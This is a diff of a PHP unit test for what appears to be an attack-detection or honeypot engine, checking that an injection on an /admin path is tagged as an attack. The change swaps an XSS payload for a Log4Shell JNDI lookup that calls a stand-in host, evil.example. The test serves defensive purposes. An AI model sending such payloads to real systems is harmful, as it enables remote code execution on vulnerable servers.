@@ -205,14 +205,17 @@ final class PanelPrecedenceTest extends TestCase
 
     public function test_genuine_attack_on_a_panel_path_is_not_relabelled_panel(): void
     {
-        // No-regression guard: the panel must not shadow a real injection aimed at an /admin path. An XSS
-        // payload is caught by the engine's attack corpus and served + tagged as the attack, not 'panel'.
+        // No-regression guard: the panel must not shadow a real injection aimed at an /admin path. The
+        // engine's attack corpus catches it and serves + tags it as the attack, not 'panel'. Use a
+        // NON-reflecting attack (log4shell/RCE) so this stays valid regardless of isolatedOrigin — the
+        // reflecting class (XSS/open-redirect) is gated by that flag (FP-0159) and is suppressed when the
+        // box does not opt in, which is orthogonal to the panel-precedence behaviour under test here.
         $store = new SqliteHitStore($this->tmpPath('hits') . '.sqlite');
         $c = $this->controller($store);
 
         ob_start();
         @$c->handle(
-            new RequestContext('GET', '/admin/search', 'q=<script>alert(1)</script>', ['User-Agent' => 'curl/8.0']),
+            new RequestContext('GET', '/admin/search', 'x=${jndi:ldap://evil.example/a}', ['User-Agent' => 'curl/8.0']),
             '9.9.9.9',
             'off'
         );
